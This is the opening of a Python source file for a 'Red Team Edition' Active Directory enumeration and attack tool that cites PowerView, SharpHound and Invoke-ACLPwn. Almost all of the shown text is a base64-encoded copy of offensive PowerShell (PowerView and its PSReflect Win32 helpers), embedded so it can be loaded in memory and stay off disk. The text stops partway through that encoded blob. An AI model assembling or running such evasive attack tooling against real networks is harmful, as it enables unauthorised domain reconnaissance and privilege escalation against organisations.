"""
Advanced Domain Enumeration Tool - Red Team Edition
Integrated with: PowerView, SharpHound, ADRecon, Invoke-ACLPwn, PowerUpSQL
Author: Security Assessment Tool
Version: 2.0
"""

import subprocess
import json
import os
import sys
import argparse
import threading
import queue
from datetime import datetime
from pathlib import Path
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import tempfile
import shutil
import base64
import ctypes
from ctypes import wintypes
import zipfile
from io import BytesIO

# Embedded tool resources (base64 encoded for in-memory use)
TOOL_RESOURCES = {
    'powerview': 'I3JlcXVpcmVzIC12ZXJzaW9uIDIKCjwjCgpQb3dlclNwbG9pdCBGaWxlOiBQb3dlclZpZXcucHMxCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KQpMaWNlbnNlOiBCU0QgMy1DbGF1c2UKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCgojPgoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMKIyBQU1JlZmxlY3QgY29kZSBmb3IgV2luZG93cyBBUEkgYWNjZXNzCiMgQXV0aG9yOiBAbWF0dGlmZXN0YXRpb24KIyAgIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXR0aWZlc3RhdGlvbi9QU1JlZmxlY3QvbWFzdGVyL1BTUmVmbGVjdC5wc20xCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIE5ldy1Jbk1lbW9yeU1vZHVsZSB7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhbiBpbi1tZW1vcnkgYXNzZW1ibHkgYW5kIG1vZHVsZQoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKCi5ERVNDUklQVElPTgoKV2hlbiBkZWZpbmluZyBjdXN0b20gZW51bXMsIHN0cnVjdHMsIGFuZCB1bm1hbmFnZWQgZnVuY3Rpb25zLCBpdCBpcwpuZWNlc3NhcnkgdG8gYXNzb2NpYXRlIHRvIGFuIGFzc2VtYmx5IG1vZHVsZS4gVGhpcyBoZWxwZXIgZnVuY3Rpb24KY3JlYXRlcyBhbiBpbi1tZW1vcnkgbW9kdWxlIHRoYXQgY2FuIGJlIHBhc3NlZCB0byB0aGUgJ2VudW0nLAonc3RydWN0JywgYW5kIEFkZC1XaW4zMlR5cGUgZnVuY3Rpb25zLgoKLlBBUkFNRVRFUiBNb2R1bGVOYW1lCgpTcGVjaWZpZXMgdGhlIGRlc2lyZWQgbmFtZSBmb3IgdGhlIGluLW1lbW9yeSBhc3NlbWJseSBhbmQgbW9kdWxlLiBJZgpNb2R1bGVOYW1lIGlzIG5vdCBwcm92aWRlZCwgaXQgd2lsbCBkZWZhdWx0IHRvIGEgR1VJRC4KCi5FWEFNUExFCgokTW9kdWxlID0gTmV3LUluTWVtb3J5TW9kdWxlIC1Nb2R1bGVOYW1lIFdpbjMyCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1vZHVsZU5hbWUgPSBbR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpCiAgICApCgogICAgJEFwcERvbWFpbiA9IFtSZWZsZWN0aW9uLkFzc2VtYmx5XS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uQXBwRG9tYWluJykuR2V0UHJvcGVydHkoJ0N1cnJlbnREb21haW4nKS5HZXRWYWx1ZSgkbnVsbCwgQCgpKQogICAgJExvYWRlZEFzc2VtYmxpZXMgPSAkQXBwRG9tYWluLkdldEFzc2VtYmxpZXMoKQoKICAgIGZvcmVhY2ggKCRBc3NlbWJseSBpbiAkTG9hZGVkQXNzZW1ibGllcykgewogICAgICAgIGlmICgkQXNzZW1ibHkuRnVsbE5hbWUgLWFuZCAoJEFzc2VtYmx5LkZ1bGxOYW1lLlNwbGl0KCcsJylbMF0gLWVxICRNb2R1bGVOYW1lKSkgewogICAgICAgICAgICByZXR1cm4gJEFzc2VtYmx5CiAgICAgICAgfQogICAgfQoKICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJE1vZHVsZU5hbWUpCiAgICAkRG9tYWluID0gJEFwcERvbWFpbgogICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgJ1J1bicpCiAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgkTW9kdWxlTmFtZSwgJEZhbHNlKQoKICAgIHJldHVybiAkTW9kdWxlQnVpbGRlcgp9CgoKIyBBIGhlbHBlciBmdW5jdGlvbiB1c2VkIHRvIHJlZHVjZSB0eXBpbmcgd2hpbGUgZGVmaW5pbmcgZnVuY3Rpb24KIyBwcm90b3R5cGVzIGZvciBBZGQtV2luMzJUeXBlLgpmdW5jdGlvbiBmdW5jIHsKICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERsbE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkRnVuY3Rpb25OYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRSZXR1cm5UeXBlLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMyldCiAgICAgICAgW1R5cGVbXV0KICAgICAgICAkUGFyYW1ldGVyVHlwZXMsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0KV0KICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dCiAgICAgICAgJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSldCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdCiAgICAgICAgJENoYXJzZXQsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEVudHJ5UG9pbnQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNldExhc3RFcnJvcgogICAgKQoKICAgICRQcm9wZXJ0aWVzID0gQHsKICAgICAgICBEbGxOYW1lID0gJERsbE5hbWUKICAgICAgICBGdW5jdGlvbk5hbWUgPSAkRnVuY3Rpb25OYW1lCiAgICAgICAgUmV0dXJuVHlwZSA9ICRSZXR1cm5UeXBlCiAgICB9CgogICAgaWYgKCRQYXJhbWV0ZXJUeXBlcykgeyAkUHJvcGVydGllc1snUGFyYW1ldGVyVHlwZXMnXSA9ICRQYXJhbWV0ZXJUeXBlcyB9CiAgICBpZiAoJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uKSB7ICRQcm9wZXJ0aWVzWydOYXRpdmVDYWxsaW5nQ29udmVudGlvbiddID0gJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uIH0KICAgIGlmICgkQ2hhcnNldCkgeyAkUHJvcGVydGllc1snQ2hhcnNldCddID0gJENoYXJzZXQgfQogICAgaWYgKCRTZXRMYXN0RXJyb3IpIHsgJFByb3BlcnRpZXNbJ1NldExhc3RFcnJvciddID0gJFNldExhc3RFcnJvciB9CiAgICBpZiAoJEVudHJ5UG9pbnQpIHsgJFByb3BlcnRpZXNbJ0VudHJ5UG9pbnQnXSA9ICRFbnRyeVBvaW50IH0KCiAgICBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkUHJvcGVydGllcwp9CgoKZnVuY3Rpb24gQWRkLVdpbjMyVHlwZQp7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhIC5ORVQgdHlwZSBmb3IgYW4gdW5tYW5hZ2VkIFdpbjMyIGZ1bmN0aW9uLgoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IGZ1bmMKCi5ERVNDUklQVElPTgoKQWRkLVdpbjMyVHlwZSBlbmFibGVzIHlvdSB0byBlYXNpbHkgaW50ZXJhY3Qgd2l0aCB1bm1hbmFnZWQgKGkuZS4KV2luMzIgdW5tYW5hZ2VkKSBmdW5jdGlvbnMgaW4gUG93ZXJTaGVsbC4gQWZ0ZXIgcHJvdmlkaW5nCkFkZC1XaW4zMlR5cGUgd2l0aCBhIGZ1bmN0aW9uIHNpZ25hdHVyZSwgYSAuTkVUIHR5cGUgaXMgY3JlYXRlZAp1c2luZyByZWZsZWN0aW9uIChpLmUuIGNzYy5leGUgaXMgbmV2ZXIgY2FsbGVkIGxpa2Ugd2l0aCBBZGQtVHlwZSkuCgpUaGUgJ2Z1bmMnIGhlbHBlciBmdW5jdGlvbiBjYW4gYmUgdXNlZCB0byByZWR1Y2UgdHlwaW5nIHdoZW4gZGVmaW5pbmcKbXVsdGlwbGUgZnVuY3Rpb24gZGVmaW5pdGlvbnMuCgouUEFSQU1FVEVSIERsbE5hbWUKClRoZSBuYW1lIG9mIHRoZSBETEwuCgouUEFSQU1FVEVSIEZ1bmN0aW9uTmFtZQoKVGhlIG5hbWUgb2YgdGhlIHRhcmdldCBmdW5jdGlvbi4KCi5QQVJBTUVURVIgRW50cnlQb2ludAoKVGhlIERMTCBleHBvcnQgZnVuY3Rpb24gbmFtZS4gVGhpcyBhcmd1bWVudCBzaG91bGQgYmUgc3BlY2lmaWVkIGlmIHRoZQpzcGVjaWZpZWQgZnVuY3Rpb24gbmFtZSBpcyBkaWZmZXJlbnQgdGhhbiB0aGUgbmFtZSBvZiB0aGUgZXhwb3J0ZWQKZnVuY3Rpb24uCgouUEFSQU1FVEVSIFJldHVyblR5cGUKClRoZSByZXR1cm4gdHlwZSBvZiB0aGUgZnVuY3Rpb24uCgouUEFSQU1FVEVSIFBhcmFtZXRlclR5cGVzCgpUaGUgZnVuY3Rpb24gcGFyYW1ldGVycy4KCi5QQVJBTUVURVIgTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24KClNwZWNpZmllcyB0aGUgbmF0aXZlIGNhbGxpbmcgY29udmVudGlvbiBvZiB0aGUgZnVuY3Rpb24uIERlZmF1bHRzIHRvCnN0ZGNhbGwuCgouUEFSQU1FVEVSIENoYXJzZXQKCklmIHlvdSBuZWVkIHRvIGV4cGxpY2l0bHkgY2FsbCBhbiAnQScgb3IgJ1cnIFdpbjMyIGZ1bmN0aW9uLCB5b3UgY2FuCnNwZWNpZnkgdGhlIGNoYXJhY3RlciBzZXQuCgouUEFSQU1FVEVSIFNldExhc3RFcnJvcgoKSW5kaWNhdGVzIHdoZXRoZXIgdGhlIGNhbGxlZSBjYWxscyB0aGUgU2V0TGFzdEVycm9yIFdpbjMyIEFQSQpmdW5jdGlvbiBiZWZvcmUgcmV0dXJuaW5nIGZyb20gdGhlIGF0dHJpYnV0ZWQgbWV0aG9kLgoKLlBBUkFNRVRFUiBNb2R1bGUKClRoZSBpbi1tZW1vcnkgbW9kdWxlIHRoYXQgd2lsbCBob3N0IHRoZSBmdW5jdGlvbnMuIFVzZQpOZXctSW5NZW1vcnlNb2R1bGUgdG8gZGVmaW5lIGFuIGluLW1lbW9yeSBtb2R1bGUuCgouUEFSQU1FVEVSIE5hbWVzcGFjZQoKQW4gb3B0aW9uYWwgbmFtZXNwYWNlIHRvIHByZXBlbmQgdG8gdGhlIHR5cGUuIEFkZC1XaW4zMlR5cGUgZGVmYXVsdHMKdG8gYSBuYW1lc3BhY2UgY29uc2lzdGluZyBvbmx5IG9mIHRoZSBuYW1lIG9mIHRoZSBETEwuCgouRVhBTVBMRQoKJE1vZCA9IE5ldy1Jbk1lbW9yeU1vZHVsZSAtTW9kdWxlTmFtZSBXaW4zMgoKJEZ1bmN0aW9uRGVmaW5pdGlvbnMgPSBAKAogIChmdW5jIGtlcm5lbDMyIEdldFByb2NBZGRyZXNzIChbSW50UHRyXSkgQChbSW50UHRyXSwgW1N0cmluZ10pIC1DaGFyc2V0IEFuc2kgLVNldExhc3RFcnJvciksCiAgKGZ1bmMga2VybmVsMzIgR2V0TW9kdWxlSGFuZGxlIChbSW50cHRyXSkgQChbU3RyaW5nXSkgLVNldExhc3RFcnJvciksCiAgKGZ1bmMgbnRkbGwgUnRsR2V0Q3VycmVudFBlYiAoW0ludFB0cl0pIEAoKSkKKQoKJFR5cGVzID0gJEZ1bmN0aW9uRGVmaW5pdGlvbnMgfCBBZGQtV2luMzJUeXBlIC1Nb2R1bGUgJE1vZCAtTmFtZXNwYWNlICdXaW4zMicKJEtlcm5lbDMyID0gJFR5cGVzWydrZXJuZWwzMiddCiROdGRsbCA9ICRUeXBlc1snbnRkbGwnXQokTnRkbGw6OlJ0bEdldEN1cnJlbnRQZWIoKQokbnRkbGxiYXNlID0gJEtlcm5lbDMyOjpHZXRNb2R1bGVIYW5kbGUoJ250ZGxsJykKJEtlcm5lbDMyOjpHZXRQcm9jQWRkcmVzcygkbnRkbGxiYXNlLCAnUnRsR2V0Q3VycmVudFBlYicpCgouTk9URVMKCkluc3BpcmVkIGJ5IExlZSBIb2xtZXMnIEludm9rZS1XaW5kb3dzQXBpIGh0dHA6Ly9wb3NoY29kZS5vcmcvMjE4OQoKV2hlbiBkZWZpbmluZyBtdWx0aXBsZSBmdW5jdGlvbiBwcm90b3R5cGVzLCBpdCBpcyBpZGVhbCB0byBwcm92aWRlCkFkZC1XaW4zMlR5cGUgd2l0aCBhbiBhcnJheSBvZiBmdW5jdGlvbiBzaWduYXR1cmVzLiBUaGF0IHdheSwgdGhleQphcmUgYWxsIGluY29ycG9yYXRlZCBpbnRvIHRoZSBzYW1lIGluLW1lbW9yeSBtb2R1bGUuCiM+CgogICAgW091dHB1dFR5cGUoW0hhc2h0YWJsZV0pXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERsbE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdW5jdGlvbk5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRW50cnlQb2ludCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRSZXR1cm5UeXBlLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtUeXBlW11dCiAgICAgICAgJFBhcmFtZXRlclR5cGVzLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DYWxsaW5nQ29udmVudGlvbl0KICAgICAgICAkTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dOjpTdGRDYWxsLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XQogICAgICAgICRDaGFyc2V0ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdOjpBdXRvLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNldExhc3RFcnJvciwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbCgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWVzcGFjZSA9ICcnCiAgICApCgogICAgQkVHSU4KICAgIHsKICAgICAgICAkVHlwZUhhc2ggPSBAe30KICAgIH0KCiAgICBQUk9DRVNTCiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkTmFtZXNwYWNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5HZXRUeXBlKCIkTmFtZXNwYWNlLiREbGxOYW1lIikKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRUeXBlSGFzaFskRGxsTmFtZV0gPSAkTW9kdWxlLkdldFR5cGUoJERsbE5hbWUpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgIyBEZWZpbmUgb25lIHR5cGUgZm9yIGVhY2ggRExMCiAgICAgICAgICAgIGlmICghJFR5cGVIYXNoLkNvbnRhaW5zS2V5KCREbGxOYW1lKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCROYW1lc3BhY2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFR5cGVIYXNoWyREbGxOYW1lXSA9ICRNb2R1bGUuRGVmaW5lVHlwZSgiJE5hbWVzcGFjZS4kRGxsTmFtZSIsICdQdWJsaWMsQmVmb3JlRmllbGRJbml0JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5EZWZpbmVUeXBlKCREbGxOYW1lLCAnUHVibGljLEJlZm9yZUZpZWxkSW5pdCcpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRNZXRob2QgPSAkVHlwZUhhc2hbJERsbE5hbWVdLkRlZmluZU1ldGhvZCgKICAgICAgICAgICAgICAgICRGdW5jdGlvbk5hbWUsCiAgICAgICAgICAgICAgICAnUHVibGljLFN0YXRpYyxQaW52b2tlSW1wbCcsCiAgICAgICAgICAgICAgICAkUmV0dXJuVHlwZSwKICAgICAgICAgICAgICAgICRQYXJhbWV0ZXJUeXBlcykKCiAgICAgICAgICAgICMgTWFrZSBlYWNoIEJ5UmVmIHBhcmFtZXRlciBhbiBPdXQgcGFyYW1ldGVyCiAgICAgICAgICAgICRpID0gMQogICAgICAgICAgICBmb3JlYWNoKCRQYXJhbWV0ZXIgaW4gJFBhcmFtZXRlclR5cGVzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFBhcmFtZXRlci5Jc0J5UmVmKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFt2b2lkXSAkTWV0aG9kLkRlZmluZVBhcmFtZXRlcigkaSwgJ091dCcsICRudWxsKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRpKysKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJERsbEltcG9ydCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnRBdHRyaWJ1dGVdCiAgICAgICAgICAgICRTZXRMYXN0RXJyb3JGaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ1NldExhc3RFcnJvcicpCiAgICAgICAgICAgICRDYWxsaW5nQ29udmVudGlvbkZpZWxkID0gJERsbEltcG9ydC5HZXRGaWVsZCgnQ2FsbGluZ0NvbnZlbnRpb24nKQogICAgICAgICAgICAkQ2hhcnNldEZpZWxkID0gJERsbEltcG9ydC5HZXRGaWVsZCgnQ2hhclNldCcpCiAgICAgICAgICAgICRFbnRyeVBvaW50RmllbGQgPSAkRGxsSW1wb3J0LkdldEZpZWxkKCdFbnRyeVBvaW50JykKICAgICAgICAgICAgaWYgKCRTZXRMYXN0RXJyb3IpIHsgJFNMRVZhbHVlID0gJFRydWUgfSBlbHNlIHsgJFNMRVZhbHVlID0gJEZhbHNlIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0VudHJ5UG9pbnQnXSkgeyAkRXhwb3J0ZWRGdW5jTmFtZSA9ICRFbnRyeVBvaW50IH0gZWxzZSB7ICRFeHBvcnRlZEZ1bmNOYW1lID0gJEZ1bmN0aW9uTmFtZSB9CgogICAgICAgICAgICAjIEVxdWl2YWxlbnQgdG8gQyMgdmVyc2lvbiBvZiBbRGxsSW1wb3J0KERsbE5hbWUpXQogICAgICAgICAgICAkQ29uc3RydWN0b3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihbU3RyaW5nXSkKICAgICAgICAgICAgJERsbEltcG9ydEF0dHJpYnV0ZSA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9yLAogICAgICAgICAgICAgICAgJERsbE5hbWUsIFtSZWZsZWN0aW9uLlByb3BlcnR5SW5mb1tdXSBAKCksIFtPYmplY3RbXV0gQCgpLAogICAgICAgICAgICAgICAgW1JlZmxlY3Rpb24uRmllbGRJbmZvW11dIEAoJFNldExhc3RFcnJvckZpZWxkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENhbGxpbmdDb252ZW50aW9uRmllbGQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ2hhcnNldEZpZWxkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEVudHJ5UG9pbnRGaWVsZCksCiAgICAgICAgICAgICAgICBbT2JqZWN0W11dIEAoJFNMRVZhbHVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIChbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dICROYXRpdmVDYWxsaW5nQ29udmVudGlvbiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XSAkQ2hhcnNldCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEV4cG9ydGVkRnVuY05hbWUpKQoKICAgICAgICAgICAgJE1ldGhvZC5TZXRDdXN0b21BdHRyaWJ1dGUoJERsbEltcG9ydEF0dHJpYnV0ZSkKICAgICAgICB9CiAgICB9CgogICAgRU5ECiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiAkVHlwZUhhc2gKICAgICAgICB9CgogICAgICAgICRSZXR1cm5UeXBlcyA9IEB7fQoKICAgICAgICBmb3JlYWNoICgkS2V5IGluICRUeXBlSGFzaC5LZXlzKQogICAgICAgIHsKICAgICAgICAgICAgJFR5cGUgPSAkVHlwZUhhc2hbJEtleV0uQ3JlYXRlVHlwZSgpCgogICAgICAgICAgICAkUmV0dXJuVHlwZXNbJEtleV0gPSAkVHlwZQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRSZXR1cm5UeXBlcwogICAgfQp9CgoKZnVuY3Rpb24gcHNlbnVtIHsKPCMKLlNZTk9QU0lTCgpDcmVhdGVzIGFuIGluLW1lbW9yeSBlbnVtZXJhdGlvbiBmb3IgdXNlIGluIHlvdXIgUG93ZXJTaGVsbCBzZXNzaW9uLgoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKCi5ERVNDUklQVElPTgoKVGhlICdwc2VudW0nIGZ1bmN0aW9uIGZhY2lsaXRhdGVzIHRoZSBjcmVhdGlvbiBvZiBlbnVtcyBlbnRpcmVseSBpbgptZW1vcnkgdXNpbmcgYXMgY2xvc2UgdG8gYSAiQyBzdHlsZSIgYXMgUG93ZXJTaGVsbCB3aWxsIGFsbG93LgoKLlBBUkFNRVRFUiBNb2R1bGUKClRoZSBpbi1tZW1vcnkgbW9kdWxlIHRoYXQgd2lsbCBob3N0IHRoZSBlbnVtLiBVc2UKTmV3LUluTWVtb3J5TW9kdWxlIHRvIGRlZmluZSBhbiBpbi1tZW1vcnkgbW9kdWxlLgoKLlBBUkFNRVRFUiBGdWxsTmFtZQoKVGhlIGZ1bGx5LXF1YWxpZmllZCBuYW1lIG9mIHRoZSBlbnVtLgoKLlBBUkFNRVRFUiBUeXBlCgpUaGUgdHlwZSBvZiBlYWNoIGVudW0gZWxlbWVudC4KCi5QQVJBTUVURVIgRW51bUVsZW1lbnRzCgpBIGhhc2h0YWJsZSBvZiBlbnVtIGVsZW1lbnRzLgoKLlBBUkFNRVRFUiBCaXRmaWVsZAoKU3BlY2lmaWVzIHRoYXQgdGhlIGVudW0gc2hvdWxkIGJlIHRyZWF0ZWQgYXMgYSBiaXRmaWVsZC4KCi5FWEFNUExFCgokTW9kID0gTmV3LUluTWVtb3J5TW9kdWxlIC1Nb2R1bGVOYW1lIFdpbjMyCgokSW1hZ2VTdWJzeXN0ZW0gPSBwc2VudW0gJE1vZCBQRS5JTUFHRV9TVUJTWVNURU0gVUludDE2IEB7CiAgICBVTktOT1dOID0gICAgICAgICAgICAgICAgICAwCiAgICBOQVRJVkUgPSAgICAgICAgICAgICAgICAgICAxICMgSW1hZ2UgZG9lc24ndCByZXF1aXJlIGEgc3Vic3lzdGVtLgogICAgV0lORE9XU19HVUkgPSAgICAgICAgICAgICAgMiAjIEltYWdlIHJ1bnMgaW4gdGhlIFdpbmRvd3MgR1VJIHN1YnN5c3RlbS4KICAgIFdJTkRPV1NfQ1VJID0gICAgICAgICAgICAgIDMgIyBJbWFnZSBydW5zIGluIHRoZSBXaW5kb3dzIGNoYXJhY3RlciBzdWJzeXN0ZW0uCiAgICBPUzJfQ1VJID0gICAgICAgICAgICAgICAgICA1ICMgSW1hZ2UgcnVucyBpbiB0aGUgT1MvMiBjaGFyYWN0ZXIgc3Vic3lzdGVtLgogICAgUE9TSVhfQ1VJID0gICAgICAgICAgICAgICAgNyAjIEltYWdlIHJ1bnMgaW4gdGhlIFBvc2l4IGNoYXJhY3RlciBzdWJzeXN0ZW0uCiAgICBOQVRJVkVfV0lORE9XUyA9ICAgICAgICAgICA4ICMgSW1hZ2UgaXMgYSBuYXRpdmUgV2luOXggZHJpdmVyLgogICAgV0lORE9XU19DRV9HVUkgPSAgICAgICAgICAgOSAjIEltYWdlIHJ1bnMgaW4gdGhlIFdpbmRvd3MgQ0Ugc3Vic3lzdGVtLgogICAgRUZJX0FQUExJQ0FUSU9OID0gICAgICAgICAgMTAKICAgIEVGSV9CT09UX1NFUlZJQ0VfRFJJVkVSID0gIDExCiAgICBFRklfUlVOVElNRV9EUklWRVIgPSAgICAgICAxMgogICAgRUZJX1JPTSA9ICAgICAgICAgICAgICAgICAgMTMKICAgIFhCT1ggPSAgICAgICAgICAgICAgICAgICAgIDE0CiAgICBXSU5ET1dTX0JPT1RfQVBQTE